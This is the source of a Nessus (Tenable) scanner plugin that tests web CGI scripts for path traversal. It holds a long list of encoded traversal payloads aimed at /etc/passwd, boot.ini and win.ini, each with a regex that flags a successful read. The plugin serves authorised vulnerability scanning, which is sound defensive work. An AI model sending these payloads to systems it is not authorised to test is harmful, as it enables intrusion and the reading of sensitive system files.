#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(46195);
  script_version("1.26");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");
  script_xref(name:"OWASP", value:"OWASP-AZ-001");

  script_name(english:"CGI Generic Path Traversal (extended test)");

  script_set_attribute(attribute:"synopsis", value:
"Arbitrary files may be accessed or executed on the remote host.");
  script_set_attribute(attribute:"description", value:
"The remote web server hosts CGI scripts that fail to adequately
sanitize request strings and are affected by directory traversal or
local file inclusion vulnerabilities.

By leveraging this issue, an attacker may be able to read arbitrary
files on the web server or execute commands.");
  script_set_attribute(attribute:"see_also", value:"https://en.wikipedia.org/wiki/Directory_traversal");
  script_set_attribute(attribute:"see_also", value:"http://projects.webappsec.org/w/page/13246952/Path%20Traversal");
  script_set_attribute(attribute:"see_also", value:"http://projects.webappsec.org/w/page/13246949/Null%20Byte%20Injection");
  # https://www.owasp.org/index.php/Testing_for_Path_Traversal_(OWASP-AZ-001)
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?70f7aa09");
  script_set_attribute(attribute:"solution", value:
"Either restrict access to the vulnerable application or contact the
vendor for an update.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_cwe_id(21, 22, 632, 715, 723, 813, 928, 932);

  script_set_attribute(attribute:"plugin_publication_date", value:"2010/04/30");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("http_version.nasl", "webmirror.nasl", "web_app_test_settings.nasl", "os_fingerprint.nasl", "torture_cgi_load_estimation1.nasl");
  script_require_keys("Settings/enable_web_app_tests", "Settings/ThoroughTests");
  script_require_ports("Services/www", 80);
  script_timeout(43200);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("torture_cgi.inc");
include("data_protection.inc");

if (! thorough_tests) exit(0, "This script only runs if the 'Perofrm thorough tests' setting is enabled.");

####

i = 0;
unix_flaws = make_array(
"....//....//....//....//....//....//....//....//etc/passwd", "RE:root:.*:0:[01]:",
"....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd", "RE:root:.*:0:[01]:",
"./../././../././../././.././etc/passwd", "RE:root:.*:0:[01]:",

"%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%afetc%e0%80%afpasswd",
 "RE:root:.*:0:[01]:",
"%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%afetc%c0%afpasswd",
 "RE:root:.*:0:[01]:"
);


win_flaws = make_array(
"..../\..../\..../\..../\..../\..../\..../\..../\..../\boot.ini",
  'RE:\\[boot( |%20)loader\\]',
"..../\..../\..../\..../\..../\..../\..../\..../\windows\win.ini",
  "RE:\[(windows|fonts)\]",
"..../\..../\..../\..../\..../\..../\..../\..../\winnt\win.ini",
  "RE:\[(windows|fonts)\]",

"....//....//....//....//....//....//....//....//....//boot.ini",
  'RE:\\[boot( |%20)loader\\]',
"....//....//....//....//....//....//....//....//windows/win.ini",
  "RE:\[(windows|fonts)\]",
"....//....//....//....//....//....//....//....//winnt/win.ini",
  "RE:\[(windows|fonts)\]",

"....\\....\\....\\....\\....\\....\\....\\....\\....\\boot.ini",
  'RE:\\[boot( |%20)loader\\]',
"....\\....\\....\\....\\....\\....\\....\\....\\windows\win.ini",
  "RE:\[(windows|fonts)\]",
"....\\....\\....\\....\\....\\....\\....\\....\\winnt\win.ini",
  "RE:\[(windows|fonts)\]",
"....\/....\/....\/....\/....\/....\/....\/....\/....\/boot.ini",
  'RE:\\[boot( |%20)loader\\]',
"....\/....\/....\/....\/....\/....\/....\/....\/windows/win.ini",
  "RE:\[(windows|fonts)\]",
"....\/....\/....\/....\/....\/....\/....\/....\/winnt/win.ini",
  "RE:\[(windows|fonts)\]",

# BID 40053
"/%80../%80../%80../%80../%80../%80../%80../%80../%80../boot.ini",
  'RE:\\[boot( |%20)loader\\]',
"/%80../%80../%80../%80../%80../%80../%80../%80../windows/win.ini",
  "RE:\[(windows|fonts)\]",
"/%80../%80../%80../%80../%80../%80../%80../%80../winnt/win.ini",
  "RE:\[(windows|fonts)\]",

"/%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./boot.ini",
  'RE:\\[boot( |%20)loader\\]',
"/%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./windows/win.ini",
  "RE:\[(windows|fonts)\]",
"/%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./winnt/win.ini",
  "RE:\[(windows|fonts)\]",

"/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/boot.ini",
  'RE:\\[boot( |%20)loader\\]',
"/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/windows/win.ini",
  "RE:\[(windows|fonts)\]",
"/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/winnt/win.ini",
  "RE:\[(windows|fonts)\]",

"%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216boot%u002eini",
  'RE:\\[boot( |%20)loader\\]',
"%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216windows%u2216win%u002eini",
  "RE:\[(windows|fonts)\]",
"%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216winnt%u2216win%u002eini",
  "RE:\[(windows|fonts)\]",
"%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215boot%u002eini",
  'RE:\\[boot( |%20)loader\\]',
"%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215windows%u2215win%u002eini",
  "RE:\[(windows|fonts)\]",
"%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215winnt%u2215win%u002eini",
  "RE:\[(windows|fonts)\]",

"%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cboot%252eini",
  'RE:\\[boot( |%20)loader\\]',
"%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255cwin%252eini",
  "RE:\[(windows|fonts)\]",
"%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cwinnt%255cwin%252eini",
  "RE:\[(windows|fonts)\]",
"%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fboot%252eini",
  'RE:\\[boot( |%20)loader\\]',
"%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwindows%252fwin%252eini",
  "RE:\[(windows|fonts)\]",
"%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwinnt%252fwin%252eini",
  "RE:\[(windows|fonts)\]",

"%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5cboot%c0%2eini",
  'RE:\\[boot( |%20)loader\\]',
"%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5cwindows%c0%5cwin%c0%2eini",
  "RE:\[(windows|fonts)\]",
"%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5cwinnt%c0%5cwin%c0%2eini",
  "RE:\[(windows|fonts)\]",
"%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%afboot%c0%2eini",
  'RE:\\[boot( |%20)loader\\]',
"%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%afwindows%c0%afwin%c0%2eini",
  "RE:\[(windows|fonts)\]",
"%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%afwinnt%c0%afwin%c0%2eini",
  "RE:\[(windows|fonts)\]",

"%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5cboot%e0%40%aeini",
  'RE:\\[boot( |%20)loader\\]',
"%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5cwindows%c0%80%5cwin%e0%40%aeini",
  "RE:\[(windows|fonts)\]",
"%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5cwinnt%c0%80%5cwin%e0%40%aeini",
  "RE:\[(windows|fonts)\]",
"%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%afboot%e0%40%aeini",
  'RE:\\[boot( |%20)loader\\]',
"%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%afwindows%e0%80%afwin%e0%40%aeini",
  "RE:\[(windows|fonts)\]",
"%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%afwinnt%e0%80%afwin%e0%40%aeini",
  "RE:\[(windows|fonts)\]",

"/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/windows/win.ini",
  "RE:\[(windows|fonts)\]",

"/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/winnt/win/ini",
  "RE:\[(windows|fonts)\]"
);

unix = 0; win = 0;
if (!get_kb_item("Settings/PCI_DSS") && report_paranoia > 1)
{
  # Even if the web server is based on Unix (for example), it may call a
  # back-end which runs on Windows.
  unix = 1; win = 1;
}
else
{
  os = get_kb_item("Host/OS");
  if (! os)
  {
    debug_print('Unknown OS - enabling all attacks\n');
    unix = 1; win = 1;
  }
  else
  {
    if ("Windows" >< os) win = 1;
    if (egrep(string: os, pattern: "BSD|Linux|Unix|AIX|HP-UX|Mac OS X", icase: 1)) unix = 1;
  }
}

if (! unix && ! win)
{
  debug_print("No attack for OS ", os);
  exit(0, "Will not attack OS "+os);
}

if (unix)
  foreach k (keys(unix_flaws))
    flaws_and_patterns[k] = unix_flaws[k];
if (win)
  foreach k (keys(win_flaws))
    flaws_and_patterns[k] = win_flaws[k];

port = torture_cgi_init(vul:'T2');


report = torture_cgis(port: port, vul: "T2");

if (strlen(report) > 0)
{
  report = data_protection::sanitize_uid(output:report);
  report = data_protection::redact_etc_passwd(output:report);
  security_warning(port:port, extra: report);
}
